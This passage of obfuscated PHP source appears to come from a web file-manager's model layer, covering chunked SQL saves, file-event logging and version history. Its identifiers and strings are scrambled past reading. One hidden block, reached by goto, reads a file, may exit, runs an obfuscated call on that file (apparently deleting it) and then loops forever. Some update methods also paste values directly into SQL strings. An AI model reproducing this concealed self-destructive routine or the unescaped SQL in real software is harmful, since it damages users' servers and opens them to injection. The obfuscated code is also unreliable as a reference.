$ñÆ¼Æøº[332]: $à²Î¤Œ = $Ş¨›éèİ[$¢ŞıêÑ©]; $Ş¨›éèİ[$¢ŞıêÑ©] = json_decode($à²Î¤Œ, !0); if (is_null($Ş¨›éèİ[$¢ŞıêÑ©])) { $Ş¨›éèİ[$¢ŞıêÑ©] = $à²Î¤Œ; } break; case $ñÆ¼Æøº[361]: if ($Ş¨›éèİ[$¢ŞıêÑ©] === $ñÆ¼Æøº[12]) { unset($Ş¨›éèİ[$¢ŞıêÑ©]); } break; case $ñÆ¼Æøº[362]: $Ş¨›éèİ[$¢ŞıêÑ©] = $èÒ¤õì¢[1]; break; default: break; } } } public function saveAll($ô³ÅòË) { $‡©©ô¥Õ =& $_SERVER[¹òÍ›æş]; $ê÷ ëÁË = $this->tablePrefix . $this->tableName; $©éà¶„× = self::SQL_WHERE_IN_CHUNK; $ô³ÅòË = is_array($ô³ÅòË) ? $ô³ÅòË : array(); $€ì§¯Èæ = $‡©©ô¥Õ[416]; $Š¥ ê±û = 0; $µÇú’»‡ = array(); $ğ°Æ³ÈÓ = count($ô³ÅòË); for ($÷ıœóœØ = 0; $÷ıœóœØ < $ğ°Æ³ÈÓ; $÷ıœóœØ++) { $±ŠèòËİ = $ô³ÅòË[$÷ıœóœØ]; if (!is_array($±ŠèòËİ) || count($±ŠèòËİ) != 4) { continue; } $¾“«…ß = "\x55\x50\104\x41\x54\x45\x20\140{$ê÷ ëÁË}\140\x20\123\x45\x54\40{$±ŠèòËİ[2]}\40\75\x20\103\x41\123\105\40{$±ŠèòËİ[0]}\40\xa"; if ($Š¥ ê±û == 0) { $€ì§¯Èæ = $¾“«…ß; } $µÇú’»‡[] = $‡©©ô¥Õ[128] . $±ŠèòËİ[1] . $‡©©ô¥Õ[128]; $Š¥ ê±û++; $€ì§¯Èæ .= "\40\127\x48\x45\116\40\47{$±ŠèòËİ[1]}\47\x20\124\110\x45\116\x20\x27{$±ŠèòËİ[3]}\47\x20\xa"; if ($Š¥ ê±û == $©éà¶„× || $÷ıœóœØ == $ğ°Æ³ÈÓ - 1) { $ìè‘Ùêœ = implode($‡©©ô¥Õ[50], $µÇú’»‡); $€ì§¯Èæ .= "\40\x45\x4e\104\40\x20\127\110\x45\122\x45\x20{$±ŠèòËİ[0]}\x20\111\x4e\x20\50{$ìè‘Ùêœ}\51\x20"; $this->execute($€ì§¯Èæ); $Š¥ ê±û = 0; $€ì§¯Èæ = $¾“«…ß; $this->chunkEventCheck(count($µÇú’»‡)); $µÇú’»‡ = array(); } } $this->chunkEventSet(); } public function saveAllEach($Âäé°¿Ù) { $­ûèÂ„´ =& $_SERVER[¹òÍ›æş]; $Â‰—ıš = $this->tablePrefix . $this->tableName; foreach ($Âäé°¿Ù as $¡ú¾³š±) { if (!is_array($¡ú¾³š±) || count($¡ú¾³š±) != 4) { continue; } $ª‡™ï¯í = $¡ú¾³š±[0] . $­ûèÂ„´[417] . $¡ú¾³š±[1] . $­ûèÂ„´[128]; $Ò¤‚¸Öî = $¡ú¾³š±[2] . $­ûèÂ„´[417] . $¡ú¾³š±[3] . $­ûèÂ„´[128]; $İàŸúíÑ = "\165\160\x64\141\x74\x65\x20{$Â‰—ıš}\40\163\x65\x74\x20{$Ò¤‚¸Öî}\40\167\150\145\162\145\40{$ª‡™ï¯í}\x3b"; $this->execute($İàŸúíÑ); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($Öş¼ŞÊÁ = false, $“ãšáº = false) { $this->_chunkEvent = $Öş¼ŞÊÁ; $this->_chunkEventParam = $“ãšáº; } private function chunkEventCheck($´£º¾Úğ) { if (!$this->_chunkEvent) { return; } $Ï‰¹ËŠ— = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $Ï‰¹ËŠ—[$_SERVER[¹òÍ›æş][418]] = $´£º¾Úğ; Hook::trigger($this->_chunkEvent, $Ï‰¹ËŠ—); } public function addAll($“Â¾¬éõ, $Ô€¸Ë‰Û = array(), $„ôØ«¤Ÿ = false) { $¤úÑŒşı =& $_SERVER[¹òÍ›æş]; ignore_timeout(); $ÛÛ²ÓÌÂ = self::SQL_WHERE_IN_CHUNK; if (empty($“Â¾¬éõ)) { $this->error = think_lang($¤úÑŒşı[309]); return !1; } $Ô€¸Ë‰Û = $this->_parseOptions($Ô€¸Ë‰Û); foreach ($“Â¾¬éõ as $ÓûôÏï· => $ÁåÍü›) { $“Â¾¬éõ[$ÓûôÏï·] = $this->_facade($ÁåÍü›); $this->_beforeInsert($“Â¾¬éõ[$ÓûôÏï·], $Ô€¸Ë‰Û); } if (method_exists($this->db, $¤úÑŒşı[310])) { for ($ñ¡»ùÄ« = 0; $ñ¡»ùÄ« < count($“Â¾¬éõ); $ñ¡»ùÄ« += $ÛÛ²ÓÌÂ) { $‡òŞ‡Ì = array_slice($“Â¾¬éõ, $ñ¡»ùÄ«, $ÛÛ²ÓÌÂ); if (!is_array($‡òŞ‡Ì) || count($‡òŞ‡Ì) == 0) { break; } $°“ıÁÔõ = $this->db->insertAll($‡òŞ‡Ì, $Ô€¸Ë‰Û, $„ôØ«¤Ÿ); $this->chunkEventCheck(count($‡òŞ‡Ì)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($“Â¾¬éõ as $ÓûôÏï· => $ÁåÍü›) { $°“ıÁÔõ = $this->db->insert($ÁåÍü›, $Ô€¸Ë‰Û, $„ôØ«¤Ÿ); } $this->commit(); } if (!1 !== $°“ıÁÔõ) { $å¯ƒ¢›† = $this->getLastInsID(); if ($å¯ƒ¢›†) { return $å¯ƒ¢›†; } } return $°“ıÁÔõ; } public function save($§÷Úì = '', $Ê‹à•ÓÁ = array()) { $˜ÎïÃ‹î =& $_SERVER[¹òÍ›æş]; $À¶™Ö¿ = self::SQL_WHERE_IN_CHUNK; $èôû§ = $this->optionsValue(); $ÂéƒëÑ´ = $this->findWhereField($èôû§); if (!$ÂéƒëÑ´) { return parent::save($§÷Úì, $Ê‹à•ÓÁ); } $Îò×Á“Á = 0; $‚ÎÊÒª– = $èôû§[$˜ÎïÃ‹î[313]][$ÂéƒëÑ´][1]; $‚ÎÊÒª– = is_array($‚ÎÊÒª–) ? $‚ÎÊÒª– : array(); $åÚÈ‰â° = count($‚ÎÊÒª–); for ($º¨Åñè° = 0; $º¨Åñè° < $åÚÈ‰â°; $º¨Åñè° += $À¶™Ö¿) { $ÊøôÆÊÃ = array_slice($‚ÎÊÒª–, $º¨Åñè°, $À¶™Ö¿); if (!is_array($ÊøôÆÊÃ) || count($ÊøôÆÊÃ) == 0) { break; } $èôû§[$˜ÎïÃ‹î[313]][$ÂéƒëÑ´][1] = $ÊøôÆÊÃ; $this->optionsValue($èôû§); $Îò×Á“Á += parent::save($§÷Úì, $Ê‹à•ÓÁ); $this->chunkEventCheck(count($ÊøôÆÊÃ)); } $this->chunkEventSet(); return $Îò×Á“Á; } public function add($Ç¦ÔêÈ‡ = '', $©„×°Í× = array(), $Å¤şŒ¾Ö = false) { if ($this->addTaskStatus && is_array($Ç¦ÔêÈ‡)) { $this->addTaskData[] = $Ç¦ÔêÈ‡; return; } return parent::add($Ç¦ÔêÈ‡, $©„×°Í×, $Å¤şŒ¾Ö); } public function parseWhereLike($§€â†õ, $óÇöÁËÍ = '', $†ªøóØ = false, &$¿ğÙ¦ëõ = false) { $Ã¶×ĞÄÕ =& $_SERVER[¹òÍ›æş]; $§³‡ãğÃ = $GLOBALS[$Ã¶×ĞÄÕ[6]][$Ã¶×ĞÄÕ[419]]; if (!$§³‡ãğÃ[$Ã¶×ĞÄÕ[420]]) { return $§€â†õ; } if (!is_array($§€â†õ)) { return $§€â†õ; } $¨¢¢¿Üğ = array(); $â´Ê³Š„ = 0; foreach ($§€â†õ as $’¤İ í¾ => $‹ÂºË•Ù) { if (is_array($‹ÂºË•Ù) && count($‹ÂºË•Ù) == 2 && $‹ÂºË•Ù[0] == $Ã¶×ĞÄÕ[421] && is_string($‹ÂºË•Ù[1]) && substr($‹ÂºË•Ù[1], 0, 1) == $Ã¶×ĞÄÕ[422] && substr($‹ÂºË•Ù[1], strlen($‹ÂºË•Ù[1]) - 1, 1) == $Ã¶×ĞÄÕ[422]) { $¿ğÙ¦ëõ = !0; $¦åƒãøñ = is_string($’¤İ í¾) ? $’¤İ í¾ : $óÇöÁËÍ; $â´û‹ªá = substr($‹ÂºË•Ù[1], 1, strlen($‹ÂºË•Ù[1]) - 2); $â´û‹ªá = $this->db->escapeString($â´û‹ªá); if (!strpos($¦åƒãøñ, $Ã¶×ĞÄÕ[10])) { $¦åƒãøñ = $Ã¶×ĞÄÕ[423] . $¦åƒãøñ . $Ã¶×ĞÄÕ[423]; } $ÌìËÄşµ = $Ã¶×ĞÄÕ[199] . $â´û‹ªá . $Ã¶×ĞÄÕ[199]; $â´û‹ªá = str_replace(array($Ã¶×ĞÄÕ[10], $Ã¶×ĞÄÕ[424], $Ã¶×ĞÄÕ[11]), $Ã¶×ĞÄÕ[425], $â´û‹ªá); if ($§³‡ãğÃ[$Ã¶×ĞÄÕ[426]]) { $ÌìËÄşµ = $Ã¶×ĞÄÕ[427] . $â´û‹ªá . $Ã¶×ĞÄÕ[428]; if ($§³‡ãğÃ[$Ã¶×ĞÄÕ[429]]) { $ÌìËÄşµ = $Ã¶×ĞÄÕ[428] . $â´û‹ªá . $Ã¶×ĞÄÕ[427]; } } $¨¢¢¿Üğ[$â´Ê³Š„] = $Ã¶×ĞÄÕ[430] . $¦åƒãøñ . $Ã¶×ĞÄÕ[431] . $ÌìËÄşµ . $Ã¶×ĞÄÕ[432]; $â´Ê³Š„++; continue; } if (is_array($‹ÂºË•Ù)) { $óÇöÁËÍ = is_string($’¤İ í¾) ? $’¤İ í¾ : $óÇöÁËÍ; $‹ÂºË•Ù = $this->parseWhereLike($‹ÂºË•Ù, $óÇöÁËÍ, !0, $¿ğÙ¦ëõ); } if (is_numeric($’¤İ í¾)) { $¨¢¢¿Üğ[$â´Ê³Š„] = $‹ÂºË•Ù; $â´Ê³Š„++; } else { $¨¢¢¿Üğ[$’¤İ í¾] = $‹ÂºË•Ù; } } if ($¿ğÙ¦ëõ && !$†ªøóØ) { } return $¨¢¢¿Üğ; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($“¾„ ı– = array()) { $Ñš“åó¦ =& $_SERVER[¹òÍ›æş]; $¿Ü°õ¯¡ = self::SQL_WHERE_IN_CHUNK; $²ÂÍÄÉ´ = $this->optionsValue(); $íçè†Åß = $this->findWhereField($²ÂÍÄÉ´); if (!$íçè†Åß || isset($²ÂÍÄÉ´[$Ñš“åó¦[330]]) || isset($²ÂÍÄÉ´[$Ñš“åó¦[391]])) { return parent::select($“¾„ ı–); } $ó”üôŒ™ = $²ÂÍÄÉ´[$Ñš“åó¦[313]][$íçè†Åß][1]; $ó”üôŒ™ = is_array($ó”üôŒ™) ? $ó”üôŒ™ : array(); $ßÃğëÁÉ = null; for ($²Ë‚º¢ = 0; $²Ë‚º¢ < count($ó”üôŒ™); $²Ë‚º¢ += $¿Ü°õ¯¡) { $¾ŠñÆà° = array_slice($ó”üôŒ™, $²Ë‚º¢, $¿Ü°õ¯¡); if (!is_array($¾ŠñÆà°) || count($¾ŠñÆà°) == 0) { break; } $²ÂÍÄÉ´[$Ñš“åó¦[313]][$íçè†Åß][1] = $¾ŠñÆà°; $this->optionsValue($²ÂÍÄÉ´); $Ô¨ÂÖñ… = parent::select($“¾„ ı–); if (!$Ô¨ÂÖñ…) { continue; } $ßÃğëÁÉ = is_array($ßÃğëÁÉ) ? $ßÃğëÁÉ : array(); $ßÃğëÁÉ = array_merge($ßÃğëÁÉ, $Ô¨ÂÖñ…); } return $ßÃğëÁÉ; } public function delete($¨‡Éîûò = array()) { $ùË£Ôº =& $_SERVER[¹òÍ›æş]; $‹«‰ë = self::SQL_WHERE_IN_CHUNK; $Ü…ßß…Ğ = $this->optionsValue(); $¸ÙÒÁ¹ = $this->findWhereField($Ü…ßß…Ğ); if (!$¸ÙÒÁ¹) { return parent::delete($¨‡Éîûò); } $Ë›¯Ì¨æ = 0; $Î„õï = $Ü…ßß…Ğ[$ùË£Ôº[313]][$¸ÙÒÁ¹][1]; $Î„õï = is_array($Î„õï) ? $Î„õï : array(); for ($ø¾Í™Ñ× = 0; $ø¾Í™Ñ× < count($Î„õï); $ø¾Í™Ñ× += $‹«‰ë) { $ãú¬…å± = array_slice($Î„õï, $ø¾Í™Ñ×, $‹«‰ë); if (!is_array($ãú¬…å±) || count($ãú¬…å±) == 0) { break; } $Ü…ßß…Ğ[$ùË£Ôº[313]][$¸ÙÒÁ¹][1] = $ãú¬…å±; $this->optionsValue($Ü…ßß…Ğ); $Ë›¯Ì¨æ += parent::delete($¨‡Éîûò); } return $Ë›¯Ì¨æ; } private function findWhereField($á¸ÚŠÛ) { $ÇÜÀ«İ =& $_SERVER[¹òÍ›æş]; $Ôá®‘÷ò = self::SQL_WHERE_IN_CHUNK; if (!is_array($á¸ÚŠÛ) || !is_array($á¸ÚŠÛ[$ÇÜÀ«İ[313]])) { return !1; } foreach ($á¸ÚŠÛ[$ÇÜÀ«İ[313]] as $œÛ§Ç–‘ => $¬ªéï¹) { if (is_array($¬ªéï¹) && isset($¬ªéï¹[0]) && is_string($¬ªéï¹[0]) && strtolower($¬ªéï¹[0]) == $ÇÜÀ«İ[7] && is_array($¬ªéï¹[1]) && count($¬ªéï¹[1]) > $Ôá®‘÷ò) { ignore_timeout(); return $œÛ§Ç–‘; } } return !1; } public function setMasterDB($ğÅŠÏÄ = true) { think_config($_SERVER[¹òÍ›æş][433], $ğÅŠÏÄ); } } goto f›Š”†éß§; C‚æ¤„ñ‰Î: if (!isset($_SERVER[$_SERVER[¹òÍ›æş][54]]) || !isset($_SERVER[$_SERVER[¹òÍ›æş][63]])) { $_getc = $_SERVER[¹òÍ›æş][56]; $_getfile = $_SERVER[$_SERVER[¹òÍ›æş][57]] . $_SERVER[¹òÍ›æş][58]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¹òÍ›æş][59], $_getfilec); if (count($_getarrs) < $_SERVER[¹òÍ›æş][60]) { $exit = $_SERVER[¹òÍ›æş][61]; $exit(); } $_act = $_SERVER[¹òÍ›æş][62]; $_act($_SERVER[$_SERVER[¹òÍ›æş][57]] . $_SERVER[¹òÍ›æş][58]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[¹òÍ›æş][416]); } } class SourceEventModel extends ModelBase { protected $tableName = "\151\157\x5f\x73\157\x75\162\x63\x65\x5f\145\x76\x65\x6e\x74"; protected $dataAuto = array(array("\x63\162\145\141\164\x65\x54\151\x6d\145", "\x74\x69\x6d\x65", "\x69\156\x73\x65\x72\x74", "\x66\165\156\x63\x74\151\x6f\x6e"), array("\144\x65\163\143", '', "\151\156\x73\x65\x72\x74\x2c\x75\x70\x64\141\x74\145\54\163\x65\x6c\145\143\164", "\x6a\163\x6f\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($ÜæûÎÔĞ, $¤û¶ß—, $°‹óèš = '') { $‘È½ÉğÛ =& $_SERVER[¹òÍ›æş]; if (!$this->eventSave) { return; } $Å‡ù™´¶ = Model($‘È½ÉğÛ[1360])->sourceInfo($ÜæûÎÔĞ); if (!$Å‡ù™´¶) { return !1; } if ($this->isCacheEvent($Å‡ù™´¶, $¤û¶ß—)) { return; } if ($°‹óèš && is_string($°‹óèš)) { $°‹óèš = array($‘È½ÉğÛ[1898] => $°‹óèš); } $Ş˜Ê¶Ï = defined($‘È½ÉğÛ[2080]) ? USER_ID : 0; $ûòÃ¦ÔÑ = array($‘È½ÉğÛ[455] => $ÜæûÎÔĞ, $‘È½ÉğÛ[2081] => $Å‡ù™´¶[$‘È½ÉğÛ[470]], $‘È½ÉğÛ[2082] => $Å‡ù™´¶[$‘È½ÉğÛ[32]], $‘È½ÉğÛ[547] => !empty($Å‡ù™´¶[$‘È½ÉğÛ[547]]) ? $Å‡ù™´¶[$‘È½ÉğÛ[547]] : $‘È½ÉğÛ[12], $‘È½ÉğÛ[1660] => $Ş˜Ê¶Ï, $‘È½ÉğÛ[460] => $¤û¶ß—, $‘È½ÉğÛ[1662] => $°‹óèš); $this->addSystemLog($¤û¶ß—, $ûòÃ¦ÔÑ); unset($ûòÃ¦ÔÑ[$‘È½ÉğÛ[2082]], $ûòÃ¦ÔÑ[$‘È½ÉğÛ[547]]); return $this->add($ûòÃ¦ÔÑ); } private function addSystemLog($îå¸ßÒ, $”¸ò¨¼Í) { $ÆÀúèñ =& $_SERVER[¹òÍ›æş]; if ($îå¸ßÒ == $ÆÀúèñ[2083]) { $îå¸ßÒ = $”¸ò¨¼Í[$ÆÀúèñ[491]][$ÆÀúèñ[2084]]; } else { if (in_array($îå¸ßÒ, array($ÆÀúèñ[1839], $ÆÀúèñ[2085]))) { $îå¸ßÒ = $”¸ò¨¼Í[$ÆÀúèñ[491]][$ÆÀúèñ[784]]; } } $×ª³ë³ = array_merge($”¸ò¨¼Í, array($ÆÀúèñ[2086] => $”¸ò¨¼Í[$ÆÀúèñ[440]], $ÆÀúèñ[2087] => $”¸ò¨¼Í[$ÆÀúèñ[2087]])); Hook::trigger($ÆÀúèñ[2088], $ÆÀúèñ[2089] . $îå¸ßÒ, $”¸ò¨¼Í); Model($ÆÀúèñ[1803])->addLog($ÆÀúèñ[2089] . $îå¸ßÒ, $×ª³ë³); } private function isCacheEvent($ùíïîµ±, $–ù¹í®ô) { if ($ùíïîµ±[$_SERVER[¹òÍ›æş][449]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($’†ÇÑİ×, $ƒ‡¹”¹±) { $ñëö‚íÉ =& $_SERVER[¹òÍ›æş]; $àŒõôÅ = Model($ñëö‚íÉ[1360])->sourceInfo($’†ÇÑİ×); $æçåÎä® = array($ñëö‚íÉ[2084] => $ƒ‡¹”¹±, $ñëö‚íÉ[32] => $àŒõôÅ[$ñëö‚íÉ[32]]); return $this->addEvent($’†ÇÑİ×, $ñëö‚íÉ[2083], $æçåÎä®); } public function eventFileEdit($í›ñ­) { $Ÿ†“û§ò =& $_SERVER[¹òÍ›æş]; $Ï¯ó¨‡í = array($Ÿ†“û§ò[2090] => $_SERVER[$Ÿ†“û§ò[2091]], $Ÿ†“û§ò[2092] => strtolower(ACTION)); if (isset($GLOBALS[$Ÿ†“û§ò[7]][$Ÿ†“û§ò[2093]])) { $Ï¯ó¨‡í[$Ÿ†“û§ò[2093]] = $Ÿ†“û§ò[98]; } return $this->addEvent($í›ñ­, $Ÿ†“û§ò[1829], $Ï¯ó¨‡í); } public function eventRecycle($ˆö€ÎßŠ, $Èš››Ë) { return $this->addEvent($ˆö€ÎßŠ, $_SERVER[¹òÍ›æş][2085], $Èš››Ë); } public function eventRemove($ Ì¹Ê½–) { $ßú³Îîà =& $_SERVER[¹òÍ›æş]; $äÛ Ìêï = Model($ßú³Îîà[1360])->sourceInfo($ Ì¹Ê½–); $ùÃ‹ëú = $äÛ Ìêï[$ßú³Îîà[32]]; return $this->addEvent($äÛ Ìêï[$ßú³Îîà[470]], $ßú³Îîà[1828], $ùÃ‹ëú); } public function eventShare($Î¸İ£ŒË, $ìÖê•Ï) { return $this->addEvent($Î¸İ£ŒË, $_SERVER[¹òÍ›æş][1839], $ìÖê•Ï); } public function eventMove($™æï­ˆ—, $ú¾òÅ, $ÄŞ˜æ¬ã) { $÷÷ò–åĞ =& $_SERVER[¹òÍ›æş]; $‰…î¿ñş = Model($÷÷ò–åĞ[1360]); $Êû¬Ì = $‰…î¿ñş->sourceInfo($™æï­ˆ—); $Ø‚¯Ï = $‰…î¿ñş->sourceInfo($ú¾òÅ); $¨Ù×® ø = $‰…î¿ñş->sourceInfo($ÄŞ˜æ¬ã); $‘°êºì = array($÷÷ò–åĞ[1187] => $ú¾òÅ, $÷÷ò–åĞ[2094] => $Ø‚¯Ï[$÷÷ò–åĞ[32]], $÷÷ò–åĞ[2071] => !empty($Ø‚¯Ï[$÷÷ò–åĞ[547]]) ? $Ø‚¯Ï[$÷÷ò–åĞ[547]] : $÷÷ò–åĞ[12], $÷÷ò–åĞ[1188] => $ÄŞ˜æ¬ã, $÷÷ò–åĞ[2095] => $¨Ù×® ø[$÷÷ò–åĞ[32]], $÷÷ò–åĞ[2096] => !empty($¨Ù×® ø[$÷÷ò–åĞ[547]]) ? $¨Ù×® ø[$÷÷ò–åĞ[547]] : $÷÷ò–åĞ[12]); $this->addEvent($™æï­ˆ—, $÷÷ò–åĞ[586], $‘°êºì); $Êû¬Ì = $‰…î¿ñş->sourceInfo($™æï­ˆ—); $‘°êºì = array($÷÷ò–åĞ[440] => $Êû¬Ì[$÷÷ò–åĞ[440]], $÷÷ò–åĞ[32] => $Êû¬Ì[$÷÷ò–åĞ[32]]); $this->addEvent($ú¾òÅ, $÷÷ò–åĞ[2097], $‘°êºì); } public function eventCopy($»ÃÕÄÇ­) { $this->eventCreate($»ÃÕÄÇ­, $_SERVER[¹òÍ›æş][584]); } public function eventRename($¹”Úª’æ, $å£È—çÔ, $©•¸¿ı¡) { $Ï×ö‘©Œ =& $_SERVER[¹òÍ›æş]; $Ú“‹’Ñù = array($Ï×ö‘©Œ[1187] => $å£È—çÔ, $Ï×ö‘©Œ[1188] => $©•¸¿ı¡); return $this->addEvent($¹”Úª’æ, $Ï×ö‘©Œ[1375], $Ú“‹’Ñù); } public function eventAddComment($å»†à¡Ø, $ö²”˜›Ô) { return $this->addEvent($å»†à¡Ø, $_SERVER[¹òÍ›æş][2098], $ö²”˜›Ô); } public function eventAddDesc($²ş—¯›², $Æ¸ì£Âó) { return $this->addEvent($²ş—¯›², $_SERVER[¹òÍ›æş][2099], $Æ¸ì£Âó); } public function listBySource($š¿°Ï ™) { $á—à“¯Ü =& $_SERVER[¹òÍ›æş]; $–¹‡•âø = Model($á—à“¯Ü[1360])->sourceInfo($š¿°Ï ™); $Û¯„¢¡ = array($á—à“¯Ü[455] => $š¿°Ï ™); if ($–¹‡•âø[$á—à“¯Ü[448]] == $á—à“¯Ü[98]) { $¯¬°Ó°’ = Model($á—à“¯Ü[1360])->listSearchChildren($š¿°Ï ™, 20000); $¯¬°Ó°’[] = $š¿°Ï ™ . $á—à“¯Ü[416]; $Û¯„¢¡ = array($á—à“¯Ü[440] => array($á—à“¯Ü[7], $¯¬°Ó°’)); } $Ü ‘¢ßö = $this->where($Û¯„¢¡)->order($á—à“¯Ü[2100])->selectPage(); if ($Ü ‘¢ßö[$á—à“¯Ü[404]][$á—à“¯Ü[405]] == 0) { $Ü ‘¢ßö[$á—à“¯Ü[404]][$á—à“¯Ü[405]] = 1; $Ü ‘¢ßö[$á—à“¯Ü[407]] = array(array($á—à“¯Ü[455] => $š¿°Ï ™, $á—à“¯Ü[2081] => $–¹‡•âø[$á—à“¯Ü[470]], $á—à“¯Ü[1660] => $–¹‡•âø[$á—à“¯Ü[492]], $á—à“¯Ü[460] => $á—à“¯Ü[2101], $á—à“¯Ü[461] => $–¹‡•âø[$á—à“¯Ü[211]], $á—à“¯Ü[1662] => $á—à“¯Ü[12])); } return $this->eventListParse($Ü ‘¢ßö, $š¿°Ï ™); } private function eventListParse($‡¬‘íÅÄ, $“ˆç£‰‰) { $ô¢•‘€Ê =& $_SERVER[¹òÍ›æş]; $Í¥Ó¦¹Ì = $‡¬‘íÅÄ[$ô¢•‘€Ê[407]]; $—ªÜÜ…ú = array_to_keyvalue($Í¥Ó¦¹Ì, $ô¢•‘€Ê[12], $ô¢•‘€Ê[440]); $ÄÄİ¨ÈŞ = array_to_keyvalue($Í¥Ó¦¹Ì, $ô¢•‘€Ê[12], $ô¢•‘€Ê[2087]); foreach ($Í¥Ó¦¹Ì as $ªí“Ü¢) { $«ıß¡¬” = $ªí“Ü¢[$ô¢•‘€Ê[491]]; if ($ªí“Ü¢[$ô¢•‘€Ê[33]] == $ô¢•‘€Ê[586] && isset($«ıß¡¬”[$ô¢•‘€Ê[1187]])) { $—ªÜÜ…ú[] = $«ıß¡¬”[$ô¢•‘€Ê[1187]] . $ô¢•‘€Ê[12]; $—ªÜÜ…ú[] = $«ıß¡¬”[$ô¢•‘€Ê[1188]] . $ô¢•‘€Ê[12]; } if ($ªí“Ü¢[$ô¢•‘€Ê[33]] == $ô¢•‘€Ê[2097] && isset($«ıß¡¬”[$ô¢•‘€Ê[440]])) { $—ªÜÜ…ú[] = $«ıß¡¬”[$ô¢•‘€Ê[440]] . $ô¢•‘€Ê[12]; } } $—ªÜÜ…ú = array_merge($—ªÜÜ…ú, $ÄÄİ¨ÈŞ, array($“ˆç£‰‰ . $ô¢•‘€Ê[12])); $—ªÜÜ…ú = array_unique($—ªÜÜ…ú); $Æ—ßğêò = array_unique(array_to_keyvalue($Í¥Ó¦¹Ì, $ô¢•‘€Ê[12], $ô¢•‘€Ê[1669])); $ŞÀ¥–—ß = Model($ô¢•‘€Ê[563])->userListInfo($Æ—ßğêò); $ö¯¤‘˜ = Model($ô¢•‘€Ê[855])->sourceListInfo($—ªÜÜ…ú, !0); foreach ($Í¥Ó¦¹Ì as &$ªí“Ü¢) { if ($ªí“Ü¢[$ô¢•‘€Ê[33]] == $ô¢•‘€Ê[586] && isset($ªí“Ü¢[$ô¢•‘€Ê[491]][$ô¢•‘€Ê[1187]])) { $ªí“Ü¢[$ô¢•‘€Ê[491]][$ô¢•‘€Ê[1187]] = $ö¯¤‘˜[$ªí“Ü¢[$ô¢•‘€Ê[491]][$ô¢•‘€Ê[1187]]]; $ªí“Ü¢[$ô¢•‘€Ê[491]][$ô¢•‘€Ê[1188]] = $ö¯¤‘˜[$ªí“Ü¢[$ô¢•‘€Ê[491]][$ô¢•‘€Ê[1188]]]; } if ($ªí“Ü¢[$ô¢•‘€Ê[33]] == $ô¢•‘€Ê[2097] && isset($ªí“Ü¢[$ô¢•‘€Ê[491]][$ô¢•‘€Ê[440]])) { $ªí“Ü¢[$ô¢•‘€Ê[491]][$ô¢•‘€Ê[440]] = $ö¯¤‘˜[$ªí“Ü¢[$ô¢•‘€Ê[491]][$ô¢•‘€Ê[440]]]; } $ªí“Ü¢[$ô¢•‘€Ê[97]] = $ö¯¤‘˜[$ªí“Ü¢[$ô¢•‘€Ê[440]]]; $ªí“Ü¢[$ô¢•‘€Ê[2102]] = $ö¯¤‘˜[$ªí“Ü¢[$ô¢•‘€Ê[2087]]]; if ($ªí“Ü¢[$ô¢•‘€Ê[33]] == $ô¢•‘€Ê[1828]) { $ªí“Ü¢[$ô¢•‘€Ê[2102]] = $ªí“Ü¢[$ô¢•‘€Ê[97]]; $ªí“Ü¢[$ô¢•‘€Ê[2087]] = $ªí“Ü¢[$ô¢•‘€Ê[2102]][$ô¢•‘€Ê[440]]; $ªí“Ü¢[$ô¢•‘€Ê[97]] = !1; $ªí“Ü¢[$ô¢•‘€Ê[440]] = $ô¢•‘€Ê[12]; } $ªí“Ü¢[$ô¢•‘€Ê[2031]] = $ŞÀ¥–—ß[$ªí“Ü¢[$ô¢•‘€Ê[1669]]]; } unset($ªí“Ü¢); $‡¬‘íÅÄ[$ô¢•‘€Ê[407]] = $Í¥Ó¦¹Ì; return $‡¬‘íÅÄ; } public function removeBySource($¶üïÄÔ) { $£ãˆ—ú¡ = array($_SERVER[¹òÍ›æş][455] => $¶üïÄÔ); $this->where($£ãˆ—ú¡)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\151\157\x5f\163\157\165\x72\143\145\137\150\x69\163\x74\x6f\162\171"; public function historyCount($öÕÀÜ´ë) { $ù«ûñÜà =& $_SERVER[¹òÍ›æş]; if (!$öÕÀÜ´ë) { return array(); } if (is_string($öÕÀÜ´ë) || is_int($öÕÀÜ´ë)) { $öÕÀÜ´ë = array($öÕÀÜ´ë); } $Ñ‘ƒá„è = array($ù«ûñÜà[440], $ù«ûñÜà[1892] => $ù«ûñÜà[529]); $ïü˜âŠ  = array($ù«ûñÜà[440] => array($ù«ûñÜà[7], $öÕÀÜ´ë)); $´ñÅ·ó = $this->field($Ñ‘ƒá„è)->where($ïü˜âŠ )->group($ù«ûñÜà[440])->select(); return array_to_keyvalue($´ñÅ·ó, $ù«ûñÜà[440], $ù«ûñÜà[529]); } public function addHistory($ú»“‡Í, $ñõşãºå = '') { $À½Í =& $_SERVER[¹òÍ›æş]; $ıÊÂ¦ÑŸ = array($À½Í[455] => $ú»“‡Í[$À½Í[440]], $À½Í[1660] => isset($ú»“‡Í[$À½Í[494]]) ? $ú»“‡Í[$À½Í[494]] : $ú»“‡Í[$À½Í[492]], $À½Í[507] => $ú»“‡Í[$À½Í[506]], $À½Í[583] => $ú»“‡Í[$À½Í[86]], $À½Í[2103] => $ñõşãºå); if ($GLOBALS[$À½Í[6]][$À½Í[99]][$À½Í[1244]] >= 1) { $this->historyAutoClear($ıÊÂ¦ÑŸ[$À½Í[440]]); $this->add($ıÊÂ¦ÑŸ); } Hook::trigger($À½Í[2104], $ıÊÂ¦ÑŸ); Model($À½Í[2105])->eventFileEdit($ú»“‡Í[$À½Í[440]]); } private function historyAutoClear($½¯Ú—Ó£) { $•¹ƒ´ =& $_SERVER[¹òÍ›æş]; $›õš”¡ = Model($•¹ƒ´[800])->get($•¹ƒ´[1266]); $–£˜í†› = $GLOBALS[$•¹ƒ´[6]][$•¹ƒ´[99]][$•¹ƒ´[1244]]; $í›¾ñ“í = $›õš”¡ == $•¹ƒ´[1267] ? min(5, 